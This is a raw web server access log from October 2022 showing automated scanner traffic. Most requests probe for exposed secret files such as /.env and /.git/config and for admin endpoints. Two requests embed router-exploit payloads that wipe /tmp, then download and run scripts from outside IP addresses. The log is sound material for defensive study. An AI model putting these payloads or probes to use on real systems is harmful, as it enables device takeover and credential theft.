23.178.112.202 - - [13/Oct/2022:18:02:08 +0000] "GET /.well-known/acme-challenge/SgWFT3ThVZKP6b1sCYtbv0iW_AgdpSHIH8fM1kTVnEs HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
51.81.167.146 - - [13/Oct/2022:18:02:13 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
66.228.40.113 - - [13/Oct/2022:18:02:18 +0000] "\x16\x03\x01\x01\x09\x01\x00\x01\x05\x03\x03\xAA\xBA\xBFl\xECH\xB6.\x9C\x9B;\x8C.=(\x8Dc%\xCF\x09\xB6\x1D\x88B5\xB9\xE0E" 400 154 "-" "-"
66.228.40.113 - - [13/Oct/2022:18:02:18 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
66.228.40.113 - - [13/Oct/2022:18:02:18 +0000] "HELP" 400 154 "-" "-"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /.DS_Store HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA426112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.1421.98 Mobile Safari/537.3"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /telescope/requests HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /s/38342e3138352e34382e3836/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /server-status HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /info.php HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /login.action HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /api/search?folderIds=0 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /config.json HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /about HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
66.228.40.113 - - [13/Oct/2022:18:02:19 +0000] "GET /v2/_catalog HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:33 +0000] "\x16\x03\x01\x01\x09\x01\x00\x01\x05\x03\x03N@-\xDAt\x16\xCFw76" 400 154 "-" "-"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "HELP" 400 154 "-" "-"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /info.php HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /.DS_Store HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /server-status HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /telescope/requests HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /s/38342e3138352e34382e3836/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA426112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.1421.98 Mobile Safari/537.3"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /v2/_catalog HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /login.action HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /about HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /api/search?folderIds=0 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
165.22.210.65 - - [13/Oct/2022:18:02:34 +0000] "GET /config.json HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
82.193.104.168 - - [13/Oct/2022:18:02:36 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "\x16\x03\x01\x01\x08\x01\x00\x01\x04\x03\x03(F\x9B\x92\xF3\x19b\x1E\xE7\xF6?\xB8\xA5\x91\xCA5uX\xA3\x0C\xBC2V\x7F\xF4\xC9\xFD\xBD\xAF`e6 \xD7\xDB\xBF\x84m\xC3\x19U\xA5^J\xD5\xFB<\xBD\xE3c\xD34\xACz\x06A]\x81\xC3" 400 154 "-" "-"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "HELP" 400 154 "-" "-"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA426112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.1421.98 Mobile Safari/537.3"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET /.DS_Store HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET /server-status HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET /telescope/requests HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:46 +0000] "GET /about HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /config.json HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /v2/_catalog HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /info.php HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /s/38342e3138352e34382e3836/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /api/search?folderIds=0 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /login.action HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
194.233.164.30 - - [13/Oct/2022:18:02:47 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
82.193.104.168 - - [13/Oct/2022:18:02:50 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
82.193.104.168 - - [13/Oct/2022:18:02:54 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
82.193.104.168 - - [13/Oct/2022:18:04:20 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "\x16\x03\x01\x01\x0B\x01\x00\x01\x07\x03\x03\x82\x9B\xF7@\x81\xD2\xD4\x03Z\xC1\x01+\xCA\xD6\x9C |\x18\xD5\xC2\xA4?\x0C\x03ZjPA\x19\xD7U4 \xC8\xA5_\x11M\xAF\x8C" 400 154 "-" "-"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "HELP" 400 154 "-" "-"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /telescope/requests HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /s/38342e3138352e34382e3836/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA426112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.1421.98 Mobile Safari/537.3"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /info.php HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /.DS_Store HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /server-status HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:26 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:27 +0000] "GET /api/search?folderIds=0 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:27 +0000] "GET /v2/_catalog HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:27 +0000] "GET /config.json HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:27 +0000] "GET /login.action HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
192.46.213.57 - - [13/Oct/2022:18:04:27 +0000] "GET /about HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
51.81.167.146 - - [13/Oct/2022:18:05:07 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
51.81.167.146 - - [13/Oct/2022:18:05:14 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
79.104.53.14 - - [13/Oct/2022:18:15:54 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
51.75.14.22 - - [13/Oct/2022:18:16:17 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0"
91.188.75.80 - - [13/Oct/2022:18:16:20 +0000] "GET /favicon.ico HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
91.188.75.80 - - [13/Oct/2022:18:16:35 +0000] "GET /ab2g HTTP/1.1" 404 122 "-" ""
91.188.75.80 - - [13/Oct/2022:18:16:35 +0000] "GET /ab2h HTTP/1.1" 404 122 "-" ""
51.75.14.22 - - [13/Oct/2022:18:18:41 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0"
91.188.75.80 - - [13/Oct/2022:18:18:43 +0000] "GET /favicon.ico HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
79.104.53.14 - - [13/Oct/2022:18:22:57 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
79.104.53.14 - - [13/Oct/2022:18:27:57 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
79.104.53.14 - - [13/Oct/2022:18:29:07 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
198.98.59.132 - - [13/Oct/2022:18:40:56 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
87.249.23.130 - - [13/Oct/2022:18:52:21 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
65.154.226.109 - - [13/Oct/2022:19:04:26 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36"
65.154.226.109 - - [13/Oct/2022:19:04:42 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36"
65.155.30.101 - - [13/Oct/2022:19:07:02 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36"
65.154.226.171 - - [13/Oct/2022:19:09:52 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36"
66.130.144.124 - - [13/Oct/2022:19:11:37 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
31.220.1.83 - - [13/Oct/2022:19:24:45 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.163.109.66 - - [13/Oct/2022:19:33:24 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.163.109.66 - - [13/Oct/2022:19:33:24 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "-"
185.163.109.66 - - [13/Oct/2022:19:33:25 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "-"
185.163.109.66 - - [13/Oct/2022:19:33:25 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 150 "-" "-"
185.163.109.66 - - [13/Oct/2022:19:33:25 +0000] "GET /favicon.ico HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
103.133.106.50 - - [13/Oct/2022:19:42:02 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 154 "-" "-"
194.165.16.37 - - [13/Oct/2022:20:09:24 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
194.165.16.37 - - [13/Oct/2022:20:09:24 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
121.188.204.80 - - [13/Oct/2022:20:12:11 +0000] "GET / HTTP/1.0" 404 552 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
59.3.171.162 - - [13/Oct/2022:20:28:17 +0000] "GET / HTTP/1.0" 404 552 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
45.61.185.198 - - [13/Oct/2022:20:53:55 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
80.94.92.239 - - [13/Oct/2022:20:59:22 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.254.53.125 - - [13/Oct/2022:21:03:03 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
34.254.53.125 - - [13/Oct/2022:21:03:04 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
34.254.53.125 - - [13/Oct/2022:21:04:37 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
128.14.133.58 - - [13/Oct/2022:21:44:40 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
183.136.225.35 - - [13/Oct/2022:22:06:36 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.35 - - [13/Oct/2022:22:08:54 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.35 - - [13/Oct/2022:22:08:55 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.35 - - [13/Oct/2022:22:08:56 +0000] "GET /robots.txt HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
198.98.59.132 - - [13/Oct/2022:23:08:14 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
83.143.86.62 - - [13/Oct/2022:23:20:15 +0000] "GET /favicon.ico HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
104.236.174.101 - - [13/Oct/2022:23:51:39 +0000] "GET /.git/HEAD HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
197.46.54.166 - - [14/Oct/2022:00:17:46 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" 404 150 "-" "Hello, world"
91.211.91.188 - - [14/Oct/2022:00:19:48 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
87.236.176.243 - - [14/Oct/2022:00:30:40 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
195.178.120.55 - - [14/Oct/2022:00:54:44 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
195.178.120.55 - - [14/Oct/2022:00:54:50 +0000] "GET /cgi-bin/;cd+%2Ftmp%3Bwget+http%3A%2F%2F45.95.55.214%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+Netgear%3Brm+-rf+wget.sh HTTP/1.1" 404 122 "-" "Momentum"
190.94.141.111 - - [14/Oct/2022:01:00:28 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
186.235.251.80 - - [14/Oct/2022:01:06:47 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.105.83.46 - - [14/Oct/2022:01:11:01 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
172.105.83.46 - - [14/Oct/2022:01:11:17 +0000] "GET /CSS/Miniweb.css HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:17 +0000] "GET / HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:17 +0000] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:17 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
172.105.83.46 - - [14/Oct/2022:01:11:17 +0000] "POST /scripts/WPnBr.dll HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xF6\xFE\xA23\x97\xA9\x09\x16\xF7\x9F\x0F\x06_q\xE7\xE9\xCC$\xCB\xFE\xC8F\x19\x9B\xC1_\xE0,\xB8\xBA\xC3U J\xFC:\xD4\x13\x1Fb\x02\xB9\xC7\xD0\xD2 \xC3\xAC\x0E<,\x22\xA0,\xCCE\xD8[\xF7\x81\xDC\xF0\x8D\x1A\x04\x00\x9C\x13\x02\x13\x03\x13\x01\x003\x009\x005\x00/\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\xC0" 400 154 "-" "-"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xE1\x1F`\xADk\xCC\x22\xDFMM\x0FQ\xC6%x~.t\xE6,w\x0FH\xEB\xDB\xA1\x9E\x19\xACm" 400 154 "-" "-"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /default.asp HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03f\x98\xF3\xF7\x07\x824&\xF9\x9C\xC6;v7\xF0" 400 154 "-" "-"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /nmaplowercheck1665709877 HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /.git/HEAD HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /localstart.aspx HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /pools/default/buckets HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "POST /sdk HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:18 +0000] "GET /Portal/Portal.mwsl HTTP/1.1" 404 150 "-" "curl/7.54.0"
172.105.83.46 - - [14/Oct/2022:01:11:21 +0000] "GET /__Additional HTTP/1.1" 404 150 "-" "curl/7.54.0"
